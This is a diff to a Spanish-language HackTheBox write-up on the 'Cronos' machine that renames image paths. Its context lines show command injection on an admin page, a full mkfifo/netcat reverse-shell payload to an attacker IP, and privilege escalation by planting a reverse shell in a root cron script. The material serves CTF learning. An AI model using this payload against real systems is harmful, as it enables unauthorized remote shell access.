@@ -3,7 +3,7 @@ title: "Cronos - WriteUp"
 date: Sat Aug 23 2025 09:45:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, reverse-shell, impacket, linpeas, exploit, wfuzz, pspy, apache]
-image: /assets/img/htb-writeups/Pasted image 20240202171303.png
+image: /assets/img/htb-writeups/Pasted-image-20240202171303.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20240202171303.png
   platform="HTB"
 %}
 
-![Cronos](/assets/img/htb-writeups/Pasted image 20240202171303.png)
+![Cronos](/assets/img/htb-writeups/Pasted-image-20240202171303.png)
 
 ---
 
@@ -23,7 +23,7 @@ Tags:
 
 ----
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240202171303.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240202171303.png)
 
 #### Acerca de Cronos:
 
@@ -73,7 +73,7 @@ Y efectivamente encontramos que hace un virtual hosting a _cronos.htb_
 
 Lo damos de alta en el archivo hosts y probamos de conectarnos por http.
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205123937.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205123937.png)
 
 Y efectivamente, podemos acceder a la web. 
 
@@ -133,7 +133,7 @@ Damos de alta los subdominios en hosts y seguimos...
 http://admin.cronos.htb/
 ```
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205125435.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205125435.png)
 
 Probamos una inyección SQL sencilla 
 
@@ -142,11 +142,11 @@ En Password: `password`
 
 Y nos muestra esta página:
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205125722.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205125722.png)
 
 Si nos ponemos en escucha con impacket la web nos responde:
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205130156.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205130156.png)
 
 ```bash
 $ sudo tcpdump -i tun0 icmp
@@ -158,7 +158,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 Al ver que responde podemos pensar que la web es vulnerable al command injection. Vamos a probar con un _whoami_
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205131901.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205131901.png)
 
 Pues parece que sí, pues vamos a intentar enviarnos una consola remota:
 
@@ -168,11 +168,11 @@ Nos ponemos a la escucha con netca o penelope por el puerto que queramos y ejecu
 10.10.14.61; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.61 4444 >/tmp/f
 ```
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205132214.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205132214.png)
 
 Le pasamos linpeas y pspy y vemos una tarea que ejecuta root cada minuto.
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205143944.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205143944.png)
 
 Vemos que podemos escribir en él
 
@@ -182,7 +182,7 @@ $ nano /var/www/laravel/artisan
 
 Y le incrustamos un reverse shell para cuando se ejecute como root nos envíe la consola de superusuario.
 
-![CRONOS](/assets/img/htb-writeups/Pasted image 20240205144133.png)
+![CRONOS](/assets/img/htb-writeups/Pasted-image-20240205144133.png)
 
 Muy fácil la escalada. Esta máquina no tiene nada de media. Más bien es una máquina EASY.
 
